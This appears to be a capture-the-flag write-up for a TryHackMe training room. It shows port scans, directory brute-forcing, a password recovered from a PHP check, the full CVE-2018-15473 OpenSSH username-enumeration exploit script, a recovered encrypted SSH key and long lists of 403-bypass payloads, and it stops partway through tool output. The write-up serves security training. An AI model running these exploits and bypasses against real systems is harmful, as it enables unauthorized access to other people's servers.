----
Get what you can't.
----

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/fcfd772a585042a171dd2855cb3bb2cb.jpeg)

### Task 1  Enpass

 Start Machine

Think-out-of-the-box

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.219.232 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.219.232:22
Open 10.10.219.232:8001
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-31 16:51 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:51
Completed NSE at 16:51, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:51
Completed NSE at 16:51, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:51
Completed NSE at 16:51, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 16:51
Completed Parallel DNS resolution of 1 host. at 16:51, 0.01s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 16:51
Scanning 10.10.219.232 [2 ports]
Discovered open port 8001/tcp on 10.10.219.232
Discovered open port 22/tcp on 10.10.219.232
Completed Connect Scan at 16:51, 2.18s elapsed (2 total ports)
Initiating Service scan at 16:51
Scanning 2 services on 10.10.219.232
Completed Service scan at 16:51, 6.38s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.219.232.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:51
Completed NSE at 16:51, 5.74s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:51
Completed NSE at 16:51, 0.71s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:51
Completed NSE at 16:51, 0.00s elapsed
Nmap scan report for 10.10.219.232
Host is up, received user-set (0.18s latency).
Scanned at 2023-07-31 16:51:15 EDT for 15s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8abf6b1e93717c990459d38d8104af46 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCicax/djwvuiP5H2ET5UJCYL3Kp7ukHPJ0YWsSBUc6o8O/wwzOkz82yJRrZAff40NmLEpbvf0Sxw2JhrtoxDmdj+FSHpV/xDUG/nRE0FU10wDB75fYP4VFKR8QbzwDu6fxkgkZ3SAWZ9R1MgjN3B49hywgwqMRNtw+z2r2rXeF56y1FFKotBtK1wA223dJ8BLE+lRkAZd4nOr5HFMwrO+kWgYzfYJgSQ+5LEH4E/X7vWGqjdBIHSoYOUvzGJJmCum2/MOQPoDw5B85Naw/aMQqsv7WM1mnTA34Z2eTO23HCKku5+Snf5amqVwHv8AfOFub0SS7AVfbIyP9fwv1psbP
|   256 40fd0cfc0ba8f52db12e3481e5c7a591 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBENyLKEyFWN1XPyR2L1nyEK5QiqJAZTV2ntHTCZqMtXKkjsDM5H7KPJ5EcYg5Rp1zPzaDZxBmPP0pDF1Rhko7sw=
|   256 7b3997f06c8aba385f487bccda72a844 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJmb0JdTeq8kjq+30Ztv/xe3wY49Jhc60LHfPd5yGiRx
8001/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: En-Pass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:51
Completed NSE at 16:51, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:51
Completed NSE at 16:51, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:51
Completed NSE at 16:51, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.26 seconds

 <div class="carousel-inner">
      <div class="carousel-item active">
        <img src="patan.jpg" class="d-block w-100" alt="img1">
        <div class="carousel-caption d-none d-md-block">
          <p>Ehvw ri Oxfn!!</p>  https://quipqiup.com/ Best of Luck!! Amount:23
        </div>
      </div>
      <div class="carousel-item">
        <img src="patan2.jpg" class="d-block w-100" alt="img2">
        <div class="carousel-caption d-none d-md-block">
          <p>U2FkCg==Z</p> Sad 
        </div>
      </div>
      <div class="carousel-item">
        <img src="3.jpg" class="d-block w-100" alt="img2">
        <div class="carousel-caption d-none d-md-block">
          <p> See every person as a mountain of sorts; we can see how they look from afar, but will never know them until we explore.</p>
        </div>
      </div>

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster dir -u http://10.10.219.232:8001/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,bak,zip,tar,tar.gz,tgz,phtml,db,sql,out,rar,js,pgp
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.219.232:8001/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              out,js,pgp,html,tar.gz,sql,php,zip,phtml,db,rar,txt,bak,tgz,tar
[+] Timeout:                 10s
===============================================================
2023/07/31 17:02:39 Starting gobuster in directory enumeration mode
===============================================================
/.phtml               (Status: 403) [Size: 280]
/.php                 (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 2563]
/.html                (Status: 403) [Size: 280]
/web                  (Status: 301) [Size: 319] [--> http://10.10.219.232:8001/web/]
/reg.php              (Status: 200) [Size: 2417]
/403.php              (Status: 403) [Size: 1123]
/zip                  (Status: 301) [Size: 319] [--> http://10.10.219.232:8001/zip/]

http://10.10.219.232:8001/zip/
┌──(witty㉿kali)-[~/Downloads]
└─$ unzip a.zip 
Archive:  a.zip
 extracting: a0.zip                  
 extracting: a50.zip                 
 extracting: a100.zip                
                                                                                       
┌──(witty㉿kali)-[~/Downloads]
└─$ unzip a0.zip 
Archive:  a0.zip
 extracting: a                       
                                                                                       
┌──(witty㉿kali)-[~/Downloads]
└─$ cat a                              
sadman

we can download it all by

wget -r http://10.10.219.232:8001/zip/
then
cd 10.10.219.232:8001;ls -lah
**Then, unzip all zip files via Bash for loop**
cd zip
mkdir unziped
for number in {0..100};do echo 'y' | unzip -d unziped a$number.zip && cat unziped/a;done

and we get sadman

reg.php

<h4 style='color:rgb(83, 21, 165);'> <?php
     

if($_SERVER["REQUEST_METHOD"] == "POST"){
   $title = $_POST["title"];
   if (!preg_match('/[a-zA-Z0-9]/i' , $title )){
          
          $val = explode(",",$title);

          $sum = 0;
          
          for($i = 0 ; $i < 9; $i++){

                if ( (strlen($val[0]) == 2) and (strlen($val[8]) ==  3 ))  {

                    if ( $val[5] !=$val[8]  and $val[3]!=$val[7] ) 
            
                        $sum = $sum+ (bool)$val[$i]."<br>"; 
                }
          
          
          }

          if ( ($sum) == 9 ){
            

              echo $result;//do not worry you'll get what you need.
              echo " Congo You Got It !! Nice ";

        
            
            }
            

                    else{

                      echo "  Try Try!!";

                
                    }
          }
        
          else{

            echo "  Try Again!! ";

      
          }     
 
  }


 
?>
</h4>

This program first checks that the input is not using alphanumeric characters. Then it creates an array $val which spits the input by any , and appends each section in the array.

For instance: 11,222,33,44,55,666,777,888,99

will be Array : [0] = 11 , [1] = 222 and so on

To pass the checks correctly, the length of index 0 has to equal 2, the length of index 8 has to equal 3, index 5 can not be the same as index 8, and lastly, index 3 cannot be the same as index 7.

One input that passes all the checks is: **,!,!,#,!,!,!,!,)))

Nice. Password : cimihan_are_you_here?

┌──(witty㉿kali)-[~/Downloads]
└─$ searchsploit openssh 7.2
------------------------------------ ---------------------------------
 Exploit Title                      |  Path
------------------------------------ ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumer | linux/remote/45210.py
OpenSSH 2.3 < 7.7 - Username Enumer | linux/remote/45233.py
OpenSSH 7.2 - Denial of Service     | linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xau | multiple/remote/39569.py
OpenSSH 7.2p2 - Username Enumeratio | linux/remote/40136.py
OpenSSH < 7.4 - 'UsePrivilegeSepara | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbi | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2 | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumerati | linux/remote/40113.txt
------------------------------------ ---------------------------------
Shellcodes: No Results

┌──(witty㉿kali)-[~/Downloads]
└─$ searchsploit -m 45939   
  Exploit: OpenSSH < 7.7 - User Enumeration (2)
      URL: https://www.exploit-db.com/exploits/45939
     Path: /usr/share/exploitdb/exploits/linux/remote/45939.py
    Codes: CVE-2018-15473
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/witty/Downloads/45939.py

┌──(root㉿kali)-[/home/witty/Downloads]
└─# python3 45939.py 10.10.219.232 test
  File "/home/witty/Downloads/45939.py", line 41
    print '[!] Failed to negotiate SSH transport'
    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?

add ()

┌──(root㉿kali)-[/home/witty/Downloads]
└─# cat 45939.py 
#!/usr/bin/env python2
# CVE-2018-15473 SSH User Enumeration by Leap Security (@LeapSecurity) https://leapsecurity.io
# Credits: Matthew Daley, Justin Gardner, Lee David Painter


import argparse, logging, paramiko, socket, sys, os

class InvalidUsername(Exception):
    pass

# malicious function to malform packet
def add_boolean(*args, **kwargs):
    pass

# function that'll be overwritten to malform the packet
old_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[
        paramiko.common.MSG_SERVICE_ACCEPT]

# malicious function to overwrite MSG_SERVICE_ACCEPT handler
def service_accept(*args, **kwargs):
    paramiko.message.Message.add_boolean = add_boolean
    return old_service_accept(*args, **kwargs)

# call when username was invalid
def invalid_username(*args, **kwargs):
    raise InvalidUsername()

# assign functions to respective handlers
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = service_accept
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = invalid_username

# perform authentication with malicious packet and username
def check_user(username):
    sock = socket.socket()
    sock.connect((args.target, args.port))
    transport = paramiko.transport.Transport(sock)

    try:
        transport.start_client()
    except paramiko.ssh_exception.SSHException:
        print('[!] Failed to negotiate SSH transport')
        sys.exit(2)

    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
    except InvalidUsername:
        print("[-] {} is an invalid username".format(username))
        sys.exit(3)
    except paramiko.ssh_exception.AuthenticationException:
        print("[+] {} is a valid username".format(username))

# remove paramiko logging
logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

parser = argparse.ArgumentParser(description='SSH User Enumeration by Leap Security (@LeapSecurity)')
parser.add_argument('target', help="IP address of the target system")
parser.add_argument('-p', '--port', default=22, help="Set port of SSH service")
parser.add_argument('username', help="Username to check for validity.")

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()

check_user(args.username)

┌──(root㉿kali)-[/home/witty/Downloads]
└─# python3 45939.py 10.10.219.232 test
[+] test is a valid username

┌──(root㉿kali)-[/home/witty/Downloads]
└─# python3 45939.py 10.10.219.232 sadman
[+] sadman is a valid username

┌──(witty㉿kali)-[~/Downloads]
└─$ ssh sadman@10.10.219.232
The authenticity of host '10.10.219.232 (10.10.219.232)' can't be established.
ED25519 key fingerprint is SHA256:2cV0vBpA0OYCjWglVQtp8ugUmI+9NoLGhpF4A1Qen0s.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.219.232' (ED25519) to the list of known hosts.
sadman@10.10.219.232: Permission denied (publickey).

uhmm

┌──(root㉿kali)-[/home/witty/Downloads]
└─# feroxbuster -u http://10.10.219.232:8001/web -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 64

[####################] - 20m   220546/220546  182/s   http://10.10.219.232:8001/web/resources/infoseek/configure/ 

┌──(root㉿kali)-[/home/witty/Downloads]
└─# feroxbuster -u http://10.10.219.232:8001/web/resources/infoseek/configure/ -w /usr/share/wordlists/dirb/common.txt -k -t 64 -s 200

200      GET       30l       37w     1766c http://10.10.219.232:8001/web/resources/infoseek/configure/key

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,3A3DBCAED659E70F7293FA98DB8C1802

V0Z7T9g2JZvMMhiZ6JzYWaWo8hubQhVIu3AcrxJZqFD0o2FW1K0bHGLbK8P+SaAc
9plhOtJX6ZUjtq92E/sinTG0wwc94VmwiA5lvGmjUtBjah4epDJs8Vt/tIpSTg8k
28ef1Q8+5+Kl4alJZWNF0RVpykVEXKqYw3kJBqQDTa4aH75MczJGfk4TY5kdZFO3
tPVajm46V2C/9OrjOpEVg2jIom+e4kJAaJdB7Jr7br3xoaYhe5YEUiSGM8YD7SUZ
azrAFkIoZ72iwdeVGR7CWgdwmDWw/nFvg6Ug/fsAGobDCf2CtwLEUtLL/XMpLvEb
AS0Wic1zPjCCGaVSyijImrh3beYgWbZzz7h5gmqfoycVKS4S+15tFZBZRA0wH05m
XfDw6It7ZZtP73i8XoOAg1gAbv6o/vR3GkF798bc0fV4bGJrpQ9MIEpOphR1SNuI
x0gjtCfIyYjwJmwlWeNmELyDAO3oIxYZBSydHko0EUBnbeOw+Jj3xvEdNO3PhZ7G
3UPIoZMH4KAdcXy15tL0MYGmXyOx+oHuDEPNHxkR3+lJ1C+BXJwtrSXU+qz9u/Sz
qavHdwzxc8+HiiWcGxN3LEdgfsKg/TKXA5X/TE7DnjVmhsL4IBCOIyPxF8ClXok7
YMwNymz269J85Y73gemMfhwvGC18dNs0xfYEMUtDWbrwJDsTezdBmssMvOHSjpr5
w+Z+sJvNabMIBVaQs+jqJoqm8EARNzA40CBQUJJdmqBfPV/xSmHzNOLdTspOShQN
5iwP3adKdq+/TCp2l8SaXQedMIf6DCPmcuUVrYK4pjAr7NzFVNUgqbYLT1J0thGr
gQBk+0RlQadN7m7BW835YeyvN0GKM35f7tUylJHcfTdjE832zB24iElDW483FvJy
RhM+bOBts0z+zVUx0Ua+OEM1sxwAAlruur4+ucCPFV1XrWYWfLo3VXvTbhPiZcXF
fmOJKaFxBFjbARQMR0IL5CH8tPz2Kbeaepp2sUZcgDZSHWAbvg0j8QVkisJJ/H7G
Vg6MdIRf+Ka9fPINxyrWnxDoIVqP5/HyuPjrmRN9wMA8lWub8okH9nlJoss3n8j5
xom80wK197o29NN6BWEUuagXSHdnU2o+9L991kScaC9XXOuRgqFrDRFBUUn1VOWJ
3p+lTLNscC+eMP0Be3U6R85b/o3grdb610A1V88pnDWGYa/oVgXelUh1SsHA0tuI
om679j9qdIP7O8m3PK0Wg/cSkjdj0vRxT539tAY1+ci99FXnO1Touo7mlaA4eRTK
LQLmzFcucQODcm3FEy18doT2llDTyloD2PmX+ipzB7mbdqw7pUXPyFTnGZoKrnhM
27L629aKxoM19Mz0xP8BoQMcCOCYklIw1vkaiPgXAYkNXXtBzwWn1SFcU57buaED
CJCnh3g19NZ/VjJ1zERJLjK1U1l/RtlejISAB35AYFUnKDG3iYXLRP3iT/R22BMd
z4uSYN10O1nr4EppAOMtdSdd9PJuwxKN/3nJvymMf3O/MmC/8DJOIyadZzEw7EbP
iU5caghFrCuuhCagiwYr+qeKM3BwMUBPeUXVWTCVmFkA7jR86XTMfjkD1vgDFj/8
-----END RSA PRIVATE KEY-----

┌──(witty㉿kali)-[~/Downloads]
└─$ nano enpass_rsa
                                                                                               
┌──(witty㉿kali)-[~/Downloads]
└─$ chmod 600 enpass_rsa 

 we need a username

http://10.10.219.232:8001/403.php

bypassing 

https://github.com/iamj0ker/bypass-403

┌──(witty㉿kali)-[~/bug_hunter]
└─$ ls
Burp-Suite                   GitTools          SQLiDetector
CertificateTransparencyLogs  knockpy_report    svn-extractor
commoncrawl                  lazyrecon         waybackMachine
Endpoints                    MyScripts         xsser
GCPBucketBrute               pastebin-scraper  XSStrike
GG-Dorking                   Photon            xxeserv
github-search                s3brute
                                                                      
┌──(witty㉿kali)-[~/bug_hunter]
└─$ git clone https://github.com/iamj0ker/bypass-403.git   
Cloning into 'bypass-403'...
remote: Enumerating objects: 111, done.
remote: Counting objects: 100% (20/20), done.
remote: Compressing objects: 100% (15/15), done.
remote: Total 111 (delta 8), reused 9 (delta 5), pack-reused 91
Receiving objects: 100% (111/111), 198.83 KiB | 1.02 MiB/s, done.
Resolving deltas: 100% (29/29), done.

┌──(witty㉿kali)-[~/bug_hunter/bypass-403]
└─$ ./bypass-403.sh 10.10.219.232:8001 403.php       
 ____                                  _  _    ___ _____ 
| __ ) _   _ _ __   __ _ ___ ___      | || |  / _ \___ / 
|  _ \| | | | '_ \ / _` / __/ __|_____| || |_| | | ||_ \ 
| |_) | |_| | |_) | (_| \__ \__ \_____|__   _| |_| |__) |
|____/ \__, | .__/ \__,_|___/___/        |_|  \___/____/ 
       |___/|_|                                          
                                               By Iam_J0ker
./bypass-403.sh https://example.com path
 
403,1123  --> 10.10.219.232:8001/403.php
403,1123  --> 10.10.219.232:8001/%2e/403.php
403,1123  --> 10.10.219.232:8001/403.php/.
403,1123  --> 10.10.219.232:8001//403.php//
403,1123  --> 10.10.219.232:8001/./403.php/./
403,1123  --> 10.10.219.232:8001/403.php -H X-Original-URL: 403.php
403,1123  --> 10.10.219.232:8001/403.php -H X-Custom-IP-Authorization: 127.0.0.1
403,1123  --> 10.10.219.232:8001/403.php -H X-Forwarded-For: http://127.0.0.1
403,1123  --> 10.10.219.232:8001/403.php -H X-Forwarded-For: 127.0.0.1:80
200,2563  --> 10.10.219.232:8001 -H X-rewrite-url: 403.php
404,277  --> 10.10.219.232:8001/403.php%20
404,277  --> 10.10.219.232:8001/403.php%09
403,1123  --> 10.10.219.232:8001/403.php?
404,277  --> 10.10.219.232:8001/403.php.html
403,1123  --> 10.10.219.232:8001/403.php/?anything
403,1123  --> 10.10.219.232:8001/403.php#
403,1123  --> 10.10.219.232:8001/403.php -H Content-Length:0 -X POST
403,1123  --> 10.10.219.232:8001/403.php/*
404,277  --> 10.10.219.232:8001/403.php.php
404,277  --> 10.10.219.232:8001/403.php.json
405,303  --> 10.10.219.232:8001/403.php  -X TRACE
403,1123  --> 10.10.219.232:8001/403.php -H X-Host: 127.0.0.1
404,277  --> 10.10.219.232:8001/403.php..;/
000,0  --> 10.10.219.232:8001/403.php;/
405,303  --> 10.10.219.232:8001/403.php -X TRACE
Way back machine:
{
  "available": null,
  "url": null
}

┌──(witty㉿kali)-[~/Downloads]
└─$ curl "http://10.10.219.232:8001/403.php" -H "X-rewrite-url: 403.php"

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>En-Pass</title>

<style>
    body{

        background-color: #351d34;
        margin: 0px;
        padding: 0;
    }

.items{

    display: flex;
    justify-content: center;
    text-align: center;
    vertical-align: top;
    flex-direction: column;

}

h1{

    font-family: Verdana, Geneva, Tahoma, sans-serif;
    color:wheat;

}
.txt{

    margin-top: -80px;
    font-size: 150px;
    font-family: sans-serif;
    color: rgb(240, 190, 190);


}


.txt2{
    margin-top: -200px;
    font-family: sans-serif;
    color: rgb(240, 190, 190);



}

h3{

    color:rgb(240, 190, 100);
    font-size: 300px;

}




</style>


</head>
<body>           



    
    <div class="items">
        <div class="txt">
             <h2>403<h2>
        </div>
        <div class="txt2">
            <h2>Forbidden<h2>
        </div>
        <div class="txt1">
            <h1>What are you looking for? <h1>
        </div>
        

    </div>
      
            
</body>
</html>  

uhmm

https://www.youtube.com/watch?v=CIhHpkybYsY
/..;

http://10.10.219.232:8001/403.php/..;/

works

<h3>Glad to see you here.Congo, you bypassed it. 'imsau' is waiting for you somewhere.</h3>

or

https://github.com/Dheerajmadhukar/4-ZERO-3

┌──(witty㉿kali)-[~/bug_hunter]
└─$ git clone https://github.com/jesusgavancho/4-ZERO-3.git
Cloning into '4-ZERO-3'...
remote: Enumerating objects: 68, done.
remote: Counting objects: 100% (68/68), done.
remote: Compressing objects: 100% (63/63), done.
remote: Total 68 (delta 27), reused 2 (delta 0), pack-reused 0
Receiving objects: 100% (68/68), 17.00 MiB | 3.85 MiB/s, done.
Resolving deltas: 100% (27/27), done.
                                                                      
┌──(witty㉿kali)-[~/bug_hunter]
└─$ cd 4-ZERO-3 
                                                                      
┌──(witty㉿kali)-[~/bug_hunter/4-ZERO-3]
└─$ ls
403-bypass.sh  img  LICENSE  README.md
                                                                      
┌──(witty㉿kali)-[~/bug_hunter/4-ZERO-3]
└─$ chmod +x 403-bypass.sh 

┌──(witty㉿kali)-[~/bug_hunter/4-ZERO-3]
└─$ ./403-bypass.sh -u http://10.10.219.232:8001/403.php --exploit
exploit
💀💀💀💀💀💀💀💀💀
💀 Have a beer🍺💀 
💀💀💀💀💀💀💀💀💀
     - twitter.com/Dheerajmadhukar : @me_dheeraj
----------------------
[+] HTTP Header Bypass
----------------------
X-Originally-Forwarded-For Payload: Status: 403, Length : 1123 
X-Originating-  Payload: Status: 403, Length : 1123 
X-Originating-IP Payload: Status: 403, Length : 1123 
True-Client-IP Payload: Status: 403, Length : 1123 
X-WAP-Profile Payload: Status: 403, Length : 1123 
From Payload: Status: 403, Length : 1123 
Profile http:// Payload: Status: 403, Length : 1123 
X-Arbitrary http:// Payload: Status: 403, Length : 1123 
X-HTTP-DestinationURL http:// Payload: Status: 403, Length : 1123 
X-Forwarded-Proto http:// Payload: Status: 403, Length : 1123 
Destination Payload: Status: 403, Length : 1123 
Proxy Payload: Status: 403, Length : 1123 
CF-Connecting_IP: Status: 403, Length : 1123 
CF-Connecting-IP: Status: 403, Length : 1123 
Referer Payload: Status: 403, Length : 1123 
X-Custom-IP-Authorization Payload: Status: 403, Length : 1123 
X-Custom-IP-Authorization..;/ Payload Status: 404, Length : 277 
X-Originating-IP Payload: Status: 403, Length : 1123 
X-Forwarded-For Payload: Status: 403, Length : 1123 
X-Remote-IP Payload: Status: 403, Length : 1123 
X-Client-IP Payload: Status: 403, Length : 1123 
X-Host Payload Status: 403, Length : 1123 
X-Forwarded-Host Payload: Status: 403, Length : 1123 
X-Original-URL Payload: Status: 403, Length : 1123 
X-Rewrite-URL Payload: Status: 403, Length : 1123 
Content-Length Payload: Status: 403, Length : 1123 
X-ProxyUser-Ip Payload: Status: 403, Length : 1123 
Base-Url Payload: Status: 403, Length : 1123 
Client-IP Payload: Status: 403, Length : 1123 
Http-Url Payload: Status: 403, Length : 1123 
Proxy-Host Payload: Status: 403, Length : 1123 
Proxy-Url Payload: Status: 403, Length : 1123 
Real-Ip Payload: Status: 403, Length : 1123 
Redirect Payload: Status: 403, Length : 1123 
Referrer Payload: Status: 403, Length : 1123 
Request-Uri Payload: Status: 403, Length : 1123 
Uri Payload: Status: 403, Length : 1123 
Url Payload: Status: 403, Length : 1123 
X-Forward-For Payload: Status: 403, Length : 1123 
X-Forwarded-By Payload: Status: 403, Length : 1123 
X-Forwarded-For-Original Payload: Status: 403, Length : 1123 
X-Forwarded-Server Payload: Status: 403, Length : 1123 
X-Forwarded Payload: Status: 403, Length : 1123 
X-Forwarder-For Payload: Status: 403, Length : 1123 
X-Http-Destinationurl Payload: Status: 403, Length : 1123 
X-Http-Host-Override Payload: Status: 403, Length : 1123 
X-Original-Remote-Addr Payload: Status: 403, Length : 1123 
X-Proxy-Url Payload: Status: 403, Length : 1123 
X-Real-Ip Payload: Status: 403, Length : 1123 
X-Remote-Addr Payload: Status: 403, Length : 1123 
X-OReferrer Payload: Status: 403, Length : 1123 
-------------------------
[+] Protocol Based Bypass
-------------------------
HTTP Scheme Payload: Status: 403, Length : 1123 
HTTPs Scheme Payload: Status: 000, Length : 0 
X-Forwarded-Scheme HTTP Payload: Status: 403, Length : 1123 
X-Forwarded-Scheme HTTPs Payload: Status: 403, Length : 1123 
-------------------------
[+] Port Based Bypass
-------------------------
X-Forwarded-Port 443 Payload: Status: 403, Length : 1123 
X-Forwarded-Port 4443 Payload: Status: 403, Length : 1123 
X-Forwarded-Port 80 Payload: Status: 403, Length : 1123 
X-Forwarded-Port 8080 Payload: Status: 403, Length : 1123 
X-Forwarded-Port 8443 Payload: Status: 403, Length : 1123 
----------------------
[+] HTTP Method Bypass
----------------------
GET :  Status: 403, Length : 1123 
POST :  Status: 403, Length : 1123 
HEAD : Status: 403, Length : 0 
OPTIONS :  Status: 403, Length : 1123 
PUT :  Status: 403, Length : 1123 
TRACE :  Status: 405, Length : 303 
PATCH :  Status: 403, Length : 1123 
TRACK :  Status: 403, Length : 1123 
CONNECT :  Status: 400, Length : 313 
UPDATE :  Status: 403, Length : 1123 
LOCK :  Status: 403, Length : 1123 
----------------------
[+] URL Encode Bypass 
----------------------
Payload [ #? ]: Status: 403, Length : 1123 
Payload [ %09 ]: Status: 404, Length : 277 
Payload [ %09%3b ]: Status: 404, Length : 277 
Payload [ %09.. ]: Status: 404, Length : 277 
Payload [ %09; ]: Status: 404, Length : 277 
Payload [ %20 ]: Status: 404, Length : 277 
Payload [ %23%3f ]: Status: 404, Length : 277 
Payload [ %252f%252f ]: Status: 404, Length : 277 
Payload [ %252f/ ]: Status: 404, Length : 277 
Payload [ %2e%2e ]: Status: 404, Length : 277 
Payload [ %2e%2e/ ]: Status: 404, Length : 277 
Payload [ %2f ]: Status: 404, Length : 277 
Payload [ %2f%20%23 ]: Status: 404, Length : 277 
Payload [ %2f%23 ]: Status: 404, Length : 277 
Payload [ %2f%2f ]: Status: 404, Length : 277 
Payload [ %2f%3b%2f ]: Status: 404, Length : 277 
Payload [ %2f%3b%2f%2f ]: Status: 404, Length : 277 
Payload [ %2f%3f ]: Status: 404, Length : 277 
Payload [ %2f%3f/ ]: Status: 404, Length : 277 
Payload [ %2f/ ]: Status: 404, Length : 277 
Payload [ %3b ]: Status: 404, Length : 277 
Payload [ %3b%09 ]: Status: 404, Length : 277 
Payload [ %3b%2f%2e%2e ]: Status: 404, Length : 277 
Payload [ %3b%2f%2e%2e%2f%2e%2e%2f%2f ]: Status: 404, Length : 277 
Payload [ %3b%2f%2e. ]: Status: 404, Length : 277 
Payload [ %3b%2f.. ]: Status: 404, Length : 277 
Payload [ %3b/%2e%2e/..%2f%2f ]: Status: 404, Length : 277 
Payload [ %3b/%2e. ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php%3b/%2e.' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ %3b/%2f%2f../ ]: Status: 404, Length : 277 
Payload [ %3b/.. ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php%3b/..' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ %3b//%2f../ ]: Status: 404, Length : 277 
Payload [ %3f%23 ]: Status: 404, Length : 277 
Payload [ %3f%3f ]: Status: 404, Length : 277 
Payload [ .. ]: Status: 404, Length : 277 
Payload [ ..%00/; ]: Status: 404, Length : 277 
Payload [ ..%00;/ ]: Status: 404, Length : 277 
Payload [ ..%09 ]: Status: 404, Length : 277 
Payload [ ..%0d/; ]: Status: 404, Length : 277 
Payload [ ..%0d;/ ]: Status: 404, Length : 277 
Payload [ ..%5c/ ]: Status: 404, Length : 277 
Payload [ ..%ff/; ]: Status: 404, Length : 277 
Payload [ ..%ff;/ ]: Status: 404, Length : 277 
Payload [ ..;%00/ ]: Status: 404, Length : 277 
Payload [ ..;%0d/ ]: Status: 404, Length : 277 
Payload [ ..;%ff/ ]: Status: 404, Length : 277 
Payload [ ..;\ ]: Status: 404, Length : 277 
Payload [ ..;\; ]: Status: 404, Length : 277 
Payload [ ..\; ]: Status: 404, Length : 277 
Payload [ /%20# ]: Status: 403, Length : 1123 
Payload [ /%20%23 ]: Status: 403, Length : 1123 
Payload [ /%252e%252e%252f/ ]: Status: 403, Length : 1123 
Payload [ /%252e%252e%253b/ ]: Status: 403, Length : 1123 
Payload [ /%252e%252f/ ]: Status: 403, Length : 1123 
